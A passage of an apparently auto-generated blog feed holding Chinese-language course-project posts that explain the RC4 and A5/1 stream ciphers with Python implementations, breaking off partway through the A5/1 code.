IoRS9t8ANzjjDcsQ3jrpdBkawY26IrjMa60MdxumMfzVs5+8acC7zQlxHbxR1NMROiMmhG3AYuwiIueEqgyaRclveK8XtblRxkV1KXXmBU6T1tZZ63SEMBhTL/Oijbu9yvwFL8PVmBY1XY0Z6FXFey2XC3Kp1IPeyFfmr40IPewWiToQiUygSTyGpJDHhijRIvTM9ns9S3tzIuNdpu16v45jkTWve2oYEJt00HDCBAGfFPa0x2WqSCZVrHBA+mcCR/zL3EJ19oMEtUdfQeKMz0rdQv0QlLoZdttr2iJsTcnT3rNpwqJUx1w6InSFu2x0TKya5a9yu24o+heRgyjqEwOtFoMkw+Fwc7OG4ZrgjsZobGbxZ5Q4wthRyr2JUeQ2xlTEt4hj3tttkg6V4s8FdY3vdeFDE2fpzp+8DctZVndbjfXABtLvdBARHJacxwCWyzEo2zc9tzabEO3dWoEmNZ7zfBTrgacZmXPhXtyVdCi86vyEaOsgi7ZurjWlnlECgKvd2jmccBAVRSPbvGc1HVtTkrIp9Ab+3aYsGPNUVlANNAXfZHQK+GEhgk36XmwZ1bkJ9LrJnOBuAurjaJE+xpQ5xUkrQPkMeMY7+b3FogDaBGdnsaFpCMGl+4l7StmrzCLSGg2GvyNEvpNmzAOJxTfyFQK1oCF8NK3Zof8WiIE3wXaRaKr9XRVQ9y/GbbADfakPU5zmDYYxLGrQoRWTtAeTq5MF8BSgoCx0ckjEKOqyckMsxVmdC+pOr2jpCRZ4SD/6nQy/OyJesfEUJxL7XZs+um/CABijUalSijgYPl3rquUbfQD7SdREwdVBLe7erRZd/WN3Hpe65rAJvePbLyWMqtQvuXMXh7Pth3fytvAss9Kz3r1HupFPumbyO07LjpK6ADMhLQYtOUmGBjXgcObaSs0k/cfItoPEAdnHT6fQfmJ9rNCCWKcC7kIBgn1VqKNPqiNzEphDKpV8iRr1NKVv+uGnc5fotDqHEZXiIfTrnJV3tKplcBPVNO0dM8J7cGJ3ydkZY1DVWGexnC34t7g+LWM0l06Xn45djTVRvclk7W/Zeg== </div>]]></content>
    
    <summary type="html">
    
      随笔
    
    </summary>
    
      <category term="随笔" scheme="0verwatch.top/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="随笔" scheme="0verwatch.top/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>RC4的原理及python实现</title>
    <link href="0verwatch.top/RC4-python.html"/>
    <id>0verwatch.top/RC4-python.html</id>
    <published>2018-12-23T03:58:51.000Z</published>
    <updated>2018-12-23T04:00:38.389Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>RC4（来自Rivest Cipher 4的缩写）是一种流加密算法，密钥长度可变。<a id="more"></a>它加解密使用相同的密钥，<code>一个字节一个字节</code>地加密。因此也属于对称加密算法。突出优点是在软件里面很容易实现。</p><h3 id="加密流程"><a href="#加密流程" class="headerlink" title="加密流程"></a>加密流程</h3><p>包含两个处理过程：一是秘钥调度算法(KSA)，用于之乱S盒的初始排列，另外一个是伪随机数生成算法(PRGA)，用来输出随机序列并修改S的当前顺序。</p><ol><li>根据秘钥生成S盒</li><li>利用PRGA生成秘钥流</li><li>秘钥与明文异或产生密文</li></ol><p>单个点拿出来分析</p><h4 id="根据秘钥生成S盒"><a href="#根据秘钥生成S盒" class="headerlink" title="根据秘钥生成S盒"></a>根据秘钥生成S盒</h4><p>初始化S盒</p><p>直接构造一个S[256]，遍历0~255，然后创建临时T[256]，用于存储种子秘钥，长度不够循环填充直到T被填满，根据T[i]将S[i]与S中的另外一个字节对换，对S的操作仅仅是交换，唯一改变的是位置，但里面的元素是没变的还是0~255</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s_box = list(range(<span class="number">256</span>)) <span class="comment">#我这里没管秘钥小于256的情况，小于256不断重复填充即可</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    j = (j + s_box[i] + ord(key[i % len(key)])) % <span class="number">256</span></span><br><span class="line">    s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line"><span class="comment">#print(type(s_box)) #for_test</span></span><br><span class="line"><span class="keyword">return</span> s_box</span><br></pre></td></tr></table></figure><p>下图很好的解释了S盒被随机化的过程</p><p><img src="https://s1.ax1x.com/2018/12/23/FyoTbQ.png" alt="FyoTbQ.png"></p><h4 id="利用PRGA生成秘钥流"><a href="#利用PRGA生成秘钥流" class="headerlink" title="利用PRGA生成秘钥流"></a>利用PRGA生成秘钥流</h4><p>从S盒选取一个元素输出，并置换S盒便于下一轮取出，选取过程取决于索引i和j，这也体现了在加密过程中S盒会变化。下面的是流程：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">res = []</span><br><span class="line">i = j =<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">    i = (i + <span class="number">1</span>) %<span class="number">256</span></span><br><span class="line">    j = (j + box[i]) %<span class="number">256</span></span><br><span class="line">    box[i], box[j] = box[j], box[i]</span><br><span class="line">    t = (box[i] + box[j])% <span class="number">256</span></span><br><span class="line">    k = box[t]</span><br><span class="line">    res.append(chr(ord(s)^k))  <span class="comment">#直接与每一个字节明文相异或</span></span><br></pre></td></tr></table></figure><h4 id="秘钥与明文异或产生密文"><a href="#秘钥与明文异或产生密文" class="headerlink" title="秘钥与明文异或产生密文"></a>秘钥与明文异或产生密文</h4><p>至于这一点就不用多说了，由于异或运算的对合性，RC4加密解密使用同一套算法。</p><h4 id="python实现："><a href="#python实现：" class="headerlink" title="python实现："></a>python实现：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_message</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"输入你的信息："</span>)</span><br><span class="line">    s = input()</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"输入你的秘钥："</span>)</span><br><span class="line">    key = input()</span><br><span class="line">    <span class="keyword">if</span> key == <span class="string">''</span>:</span><br><span class="line">        key = <span class="string">'none_public_key'</span></span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_box</span><span class="params">(key)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    S盒 </span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    s_box = list(range(<span class="number">256</span>)) <span class="comment">#我这里没管秘钥小于256的情况，小于256应该不断重复填充即可</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + ord(key[i % len(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment">#print(type(s_box)) #for_test</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ex_encrypt</span><span class="params">(plain,box,mode)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    利用PRGA生成秘钥流并与密文字节异或，加解密同一个算法</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">'2'</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            c_mode = input(<span class="string">"输入你的解密模式:Base64 or ordinary\n"</span>)</span><br><span class="line">            <span class="keyword">if</span> c_mode == <span class="string">'Base64'</span>:</span><br><span class="line">                plain = base64.b64decode(plain)</span><br><span class="line">                plain = bytes.decode(plain)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> c_mode == <span class="string">'ordinary'</span>:</span><br><span class="line">                plain = plain</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"Something Wrong,请重新新输入"</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    res = []</span><br><span class="line">    i = j =<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) %<span class="number">256</span></span><br><span class="line">        j = (j + box[i]) %<span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j])% <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(chr(ord(s)^k))</span><br><span class="line"></span><br><span class="line">    cipher = <span class="string">""</span>.join(res)</span><br><span class="line">    <span class="comment">#print(cipher)</span></span><br><span class="line">    <span class="keyword">if</span>  mode == <span class="string">'1'</span>:</span><br><span class="line">        <span class="comment"># 化成可视字符需要编码</span></span><br><span class="line">        print(<span class="string">"加密后的输出(没经过任何编码):"</span>)</span><br><span class="line">        print(cipher)</span><br><span class="line">        <span class="comment"># base64的目的也是为了变成可见字符</span></span><br><span class="line">        print(<span class="string">"base64后的编码:"</span>)</span><br><span class="line">        print(str(base64.b64encode(cipher.encode(<span class="string">'utf-8'</span>)),<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">'2'</span>:</span><br><span class="line">        print(<span class="string">"解密后的密文："</span>)</span><br><span class="line">        print(cipher)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mode</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"请选择加密或者解密"</span>)</span><br><span class="line">    print(<span class="string">"1. Encrypt"</span>)</span><br><span class="line">    print(<span class="string">"2. Decode"</span>)</span><br><span class="line">    mode = input()</span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">'1'</span>:</span><br><span class="line">        message = get_message()</span><br><span class="line">        key = get_key()</span><br><span class="line">        box = init_box(key)</span><br><span class="line">        ex_encrypt(message,box,mode)</span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">'2'</span>:</span><br><span class="line">        message = get_message()</span><br><span class="line">        key = get_key()</span><br><span class="line">        box = init_box(key)</span><br><span class="line">        ex_encrypt(message, box, mode)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"输入有误！"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        get_mode()</span><br></pre></td></tr></table></figure><h3 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h3><ol><li>由于RC4算法加密是采用的xor，所以，一旦子密钥序列出现了重复，密文就有可能被破解。所以必须对加密密钥进行测试，判断其是否为弱密钥。</li><li>当然，现在RC4已经不安全了，可以参考这篇<a href="https://arstechnica.com/information-technology/2015/07/once-theoretical-crypto-attack-against-https-now-verges-on-practicality/" target="_blank" rel="noopener">文章</a>，破解RC4现在是具有很高效率的。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;RC4（来自Rivest Cipher 4的缩写）是一种流加密算法，密钥长度可变。
    
    </summary>
    
      <category term="密码学" scheme="0verwatch.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="密码学" scheme="0verwatch.top/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>A5的原理及python实现</title>
    <link href="0verwatch.top/A5-python.html"/>
    <id>0verwatch.top/A5-python.html</id>
    <published>2018-12-22T11:38:53.000Z</published>
    <updated>2018-12-22T11:44:12.849Z</updated>
    
    <content type="html"><![CDATA[<p>最近要做密码学课程设计，每做一个密码就当复习一下，把算法原理啥的都过一遍<a id="more"></a>吧</p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>这个是用于GSM系统的序列密码算法，A5的特点是效率高，适合硬件上高效实现。</p><h3 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h3><ol><li>A5 / 1基于三个线性反馈移位寄存器LFSR的组合，三个寄存器的长度分别为 19 22 23位，然后产生一个114位的秘钥流。因此首先输入8个字节的秘钥去填充三个寄存器的总长也就是64位。</li><li>每次获取各寄存器的最后一位相互异或一下再与明文进行异或。从这一点还是可以看出关键点在于秘钥，异或了两遍原信息一致，所以加密解密都是一样的算法了。</li><li>然后根据寄存器的某一位决定是否需要对某个储存器进行移位，存在的数据多的决定</li></ol><p>引用维基百科的一个图，这个图很好的揭示了加密的流程</p><p><img src="https://s1.ax1x.com/2018/12/22/FyME6I.png" alt="FyME6I.png"></p><p>总结要注意的加密的几个点：</p><h4 id="产生秘钥流"><a href="#产生秘钥流" class="headerlink" title="产生秘钥流"></a>产生秘钥流</h4><ol><li>根据8位秘钥产生的64位二进制填充寄存器</li><li>输出秘钥流，每一位都遵循<code>Z1[18]^Z2[21]^Z3[22]</code>这样的流程，我们需要注意的是这里讲序列密码的时候用<code>+</code>表示的都是异或</li><li>然后就经过114轮迭代，就可以产生114位秘钥啦</li></ol><h4 id="寄存器反馈"><a href="#寄存器反馈" class="headerlink" title="寄存器反馈"></a>寄存器反馈</h4><p>遵循“服从多数”的原则，从每个寄存器里面取出一个中间位(上图标黄的位置)进行运算，取出的3个中间位里面至少有两个1，则中间位为1的就进行移位，为0的就不移位，反之至少两个为0，则为0的进行一次位移，为1的就不移位了，保证了每次至少有了两个LFSR被驱动移位了。</p><h4 id="生成的补充值"><a href="#生成的补充值" class="headerlink" title="生成的补充值"></a>生成的补充值</h4><p>补充值由某些抽头位进行异或运算的结果决定，运算结果为1则补充为1，否则补充0,3个LFSR里的抽头位如下图，但是补充的前提是又寄存器反馈决定的</p><p><img src="https://s1.ax1x.com/2018/12/22/FyG33F.png" alt="FyG33F.png"></p><h4 id="python实现："><a href="#python实现：" class="headerlink" title="python实现："></a>python实现：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"></span><br><span class="line">X = <span class="string">''</span></span><br><span class="line">Y = <span class="string">''</span></span><br><span class="line">Z = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2bin</span><span class="params">(str_mess)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str_mess:</span><br><span class="line">        tmp = bin(ord(i))[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line">        res += tmp</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin2str</span><span class="params">(bin_mess)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    tmp = re.findall(<span class="string">r'.&#123;8&#125;'</span>,bin_mess)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">        res += chr(int(i,<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LFSRinit</span><span class="params">()</span>:</span> <span class="comment">#用64bit密钥初始3个移位寄存器,分别是19,22,23位</span></span><br><span class="line">    <span class="keyword">global</span> X</span><br><span class="line">    <span class="keyword">global</span> Y</span><br><span class="line">    <span class="keyword">global</span> Z</span><br><span class="line">    key = input(<span class="string">"请输入8位秘钥\n"</span>)</span><br><span class="line">    <span class="keyword">while</span> len(key) != <span class="number">8</span>:   <span class="comment">#限定只能是8位，然后生成64位的二进制流</span></span><br><span class="line">        key = input(<span class="string">"请输入8位秘钥\n"</span>)</span><br><span class="line">    key_bin_str = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">        tmp = bin(ord(i))[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line">        key_bin_str += tmp</span><br><span class="line">    X = key_bin_str[<span class="number">0</span>:<span class="number">19</span>]</span><br><span class="line">    Y = key_bin_str[<span class="number">19</span>:<span class="number">41</span>]</span><br><span class="line">    Z = key_bin_str[<span class="number">41</span>:]</span><br><span class="line">    <span class="comment"># print("X"+X)</span></span><br><span class="line">    <span class="comment"># print("Y"+Y)</span></span><br><span class="line">    <span class="comment"># print("Z"+Z)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(bin_str,bin_key)</span>:</span> <span class="comment">#输入的字符串的二进制流</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(bin_str)):</span><br><span class="line">        <span class="keyword">if</span> bin_str[i] == bin_key[i]:</span><br><span class="line">            res += <span class="string">'0'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res += <span class="string">'1'</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_key</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> X</span><br><span class="line">    <span class="keyword">global</span> Y</span><br><span class="line">    <span class="keyword">global</span> Z</span><br><span class="line">    LFSRinit()</span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">114</span>):   <span class="comment"># A5 / 1用于为每个突发产生114比特的密钥流序列</span></span><br><span class="line">        <span class="comment"># a = X[-1]</span></span><br><span class="line">        <span class="comment"># b = Y[-1]</span></span><br><span class="line">        <span class="comment"># c = Z[-1]</span></span><br><span class="line">        g  = int(X[<span class="number">-1</span>]) ^ int(Y[<span class="number">-1</span>]) ^ int(Z[<span class="number">-1</span>])</span><br><span class="line">        res += str(g)  <span class="comment">#用最后一位异或产生秘钥流</span></span><br><span class="line">        x =  str(int(X[<span class="number">13</span>]) ^  int(X[<span class="number">16</span>]) ^ int(X[<span class="number">17</span>]) ^ int(X[<span class="number">18</span>]) ^ <span class="number">1</span>)               <span class="comment">#候选位的值</span></span><br><span class="line">        y =  str(int(Y[<span class="number">20</span>]) ^ int(Y[<span class="number">21</span>]) ^ <span class="number">1</span>)</span><br><span class="line">        z = str(int(Z[<span class="number">7</span>]) ^ int(Z[<span class="number">20</span>]) ^ int(Z[<span class="number">21</span>]) ^ int(Z[<span class="number">22</span>]) ^ <span class="number">1</span>)</span><br><span class="line">        <span class="comment">#选择的钟控位</span></span><br><span class="line">        c_x = int(X[<span class="number">8</span>])</span><br><span class="line">        c_y = int(Y[<span class="number">10</span>])</span><br><span class="line">        c_z = int(Z[<span class="number">10</span>])</span><br><span class="line">        <span class="keyword">if</span> (c_x + c_y + c_z) &gt;= <span class="number">2</span>:<span class="comment">#多数的占优</span></span><br><span class="line">            choice = <span class="string">'1'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            choice = <span class="string">'0'</span></span><br><span class="line">        <span class="keyword">if</span> str(c_x) == choice:</span><br><span class="line">            X = x + X[:<span class="number">-1</span>] <span class="comment">#隐式位移，这里是不包含最后一位的</span></span><br><span class="line">        <span class="keyword">if</span> str(c_y) == choice:</span><br><span class="line">            Y = y + Y[:<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">if</span> str(c_z) == choice:</span><br><span class="line">            Z = z + Z[:<span class="number">-1</span>]</span><br><span class="line">        <span class="comment"># print("X"+X)</span></span><br><span class="line">        <span class="comment"># print("Y"+Y)</span></span><br><span class="line">        <span class="comment"># print("Z"+Z)</span></span><br><span class="line">    <span class="comment"># print(res)</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a5_encode</span><span class="params">(mess)</span>:</span></span><br><span class="line">    bin_mess = str2bin(mess)</span><br><span class="line">    bin_key = create_key()</span><br><span class="line">    bin_cipher = <span class="string">""</span></span><br><span class="line">    <span class="comment">#print(len(bin_mess))</span></span><br><span class="line">    <span class="keyword">if</span> len(bin_mess) % <span class="number">114</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(bin_mess), <span class="number">114</span>):</span><br><span class="line">            bin_cipher += xor(bin_mess, bin_key)</span><br><span class="line">    <span class="keyword">elif</span> len(bin_mess) &gt; <span class="number">114</span>:</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(bin_mess)):</span><br><span class="line">            bin_cipher += str(int(bin_mess[i]) ^ int(bin_key[i]))</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> j == <span class="number">114</span>:</span><br><span class="line">                j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(bin_mess)):</span><br><span class="line">            bin_cipher += str(int(bin_mess[i]) ^ int(bin_key[i]))</span><br><span class="line">    print(<span class="string">"二进制密文"</span> + bin_cipher)</span><br><span class="line">    print(<span class="string">"十六进制密文"</span>+hex(int(bin_cipher,<span class="number">2</span>)))</span><br><span class="line">    str_cipher = bin2str(bin_cipher)</span><br><span class="line">    print(base64.b64encode(str_cipher.encode(<span class="string">'utf-8'</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a5_decode</span><span class="params">(bin_mess)</span>:</span></span><br><span class="line">    bin_key = create_key()</span><br><span class="line">    bin_cipher = <span class="string">""</span></span><br><span class="line">    <span class="comment"># print(len(bin_mess))</span></span><br><span class="line">    <span class="keyword">if</span> len(bin_mess) % <span class="number">114</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(bin_mess), <span class="number">114</span>):</span><br><span class="line">            bin_cipher += xor(bin_mess, bin_key)</span><br><span class="line">    <span class="keyword">elif</span> len(bin_mess) &gt; <span class="number">114</span>:</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(bin_mess)):</span><br><span class="line">            bin_cipher += str(int(bin_mess[i]) ^ int(bin_key[i]))</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> j == <span class="number">114</span>:</span><br><span class="line">                j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span 